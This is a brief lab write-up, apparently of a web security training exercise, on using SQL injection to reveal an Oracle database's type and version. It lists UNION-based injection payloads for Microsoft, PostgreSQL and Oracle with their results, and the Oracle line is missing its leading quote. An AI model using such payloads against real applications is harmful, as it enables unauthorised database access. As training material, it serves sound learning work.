SQL injection attack, querying the database type and version on Oracle. To solve the lab, display the database version string. 

In order to display the version of the database we first need to find out its type so we know the correct syntax for our query.
After we have determined that the database is vulnerable to SQLi - we can structure queries using the different syntax per type of database


Microsoft: ' union select null, @@version -- --> Internal Server Error

PostgreSQL: ' union select null, version()-- --> Internal Server Error

Oracle:  union select null, banner FROM v$version-- --> Database type and version displayed on the page
